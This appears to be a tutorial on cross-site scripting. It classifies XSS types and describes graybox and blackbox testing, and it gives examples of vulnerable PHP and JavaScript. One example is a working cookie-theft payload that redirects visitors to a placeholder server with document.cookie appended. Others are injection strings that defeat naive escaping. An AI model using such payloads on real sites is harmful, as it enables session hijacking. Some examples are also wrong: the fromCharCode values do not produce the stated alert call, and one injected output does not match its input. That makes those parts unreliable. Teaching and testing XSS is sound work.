# XSS (c'est du balaise!! ^_^ Lol)

## Champ lexical

* [JavaScript]()
* [Session Cookies]()
* [Web Client]()
* [Web Server]()
* [XMLHttpRequest]()
* [WAF]()
* [Proxy]()
* [SOP]()
* [HTML]()
* [DOM]()

## Nomenclature 
### XSS stands for:
Cross Site Scripting
### Exploitability
Easy / Medium / Difficult according to the context
### Impact : 
Several: `disfigurements, theft of cookie, unauthorized files access, DoS, control victim browser, ` 
# Cross Site Scripting 
-----
## Overview 
The XSS attack is an attack realized when data submit from end user is `interpretted by a browser`.
It is classified among `injection attacks`.  Early on, it was categorized as **three** kinds, `stored`, `DOM based` and `reflected`. 
* These three types were defined as follows :

  * __Stored XSS__: generally occurs when server stocks submitted data from one user and then this data could be seen by others users : in a message log, in user log, in user credentials, in message form, in user cv.

  * __Reflected XSS__ : when the user supplied data is automatically replied to the same user without escapping from the server. 

  * __DOM based XSS__ : when the user input is not sent to the server but is used to automatically update its `DOM`.

* This classification was quickly deprecated. To clarify it, the research community proposed two new terms to help organize the types of XSS that can occur :
  * **Server XSS**
  * **Client XSS**

### Server XSS 
---
Server XSS occurs when untrusted data from user is replied with server generated HTML. In this case, the entire vulnerability is in **server-side code**, and the browser is simply rendering the response and executing any valid script embedded within it.

### Client XSS
----
Client XSS occurs when `untrusted data` is used to update the `DOM` with an unsafe call of **client-side script**. 

## How to test for XSS 
* `Graybox` test is the best way to test for XSS. Each HTTP data input and printed after could possibly be an XSS attack vector if the input is not escapped. 
For example this code is vulnerable.
```
    <?php
    echo 'Hello <h1>' .$_GET["name"]. '!</h1>';
    ?>
```
If the value of name is ```</h1><script>alert('xss');</script><h1>``` the browser will get the following answer from the server 
```
    <h1>!</h1>
    <script>alert('xss');</script>
    <h1></h1>
```	


* The best way to perform `black blackbox` XSS test in server is to use a `proxy`, `dirbust` the website and `analyze` all submitted data to the server and inject some HTML characters and analyse the server responses. Submit to check :
  * HTTP headers
  * URL parameters, query string
  * Request body, form data
  * Cookies, API storage 

From all the website submits listed, test with HTML chars (html entities), and look the render in browser. If it is not well escaped (the result is not HTML special character), probably the website is XSS vulnerable.

 
---
## Examples     
### Example 1 : cookie theft 
This code will send the cookie of the user who visit the website containing this payload. 

```
    <img src="nonExistImg" onerror="myFunction()"/>
    <script>function myFunction(){
	window.location = "http://myServer/?cookie".concat("=", document.cookie);
	}
    </script>
```

### Example 2 : XSS with weak js function 

```	
    myFunction(){
	myImg.src = document.getElementById('imgId').value; 
	document.body.appendChild(myImg); 
	}

```
If the user sends ```'); alert('xss'); document.getElement('``` the code will become ```myImg.src = document.getElementById(''); alert('xss'); document.getElementById('imgId').value;```

### Example 3 : Bad escapping
```
   myFunction(){
	userInputEscapped = userInput.replace('<script>', ' ');
	document.appendChild(userInputEscapped);
	}

```
This function appends to the document body the user input. It replaces the user input containing <script> by " ". 
For example, if a user inputs ```<script>alert("test");</script>``` the result will be ```alert("test");``` and then will not be executed.
This kind of escapping is very unuseful. If the attacker choose ```<SCRIPT>alert('test');</SCRIPT>``` the replace method is case sensitive, so the js script will be executed. 
``` 
myFunction(){
	userInputEscapped = userInput.replace('"', ' '); 
	document.body.appendChild(userInputEscapped); 
	}
  ```
In this example the quote char is replaced with ' '. An attacker could attack this implementation by using ```String.fromCharCode(35,120,115,115,34);``` to get ```alert("XSS")```.


## Counter Measures
Rule #1: Never trust client 
 
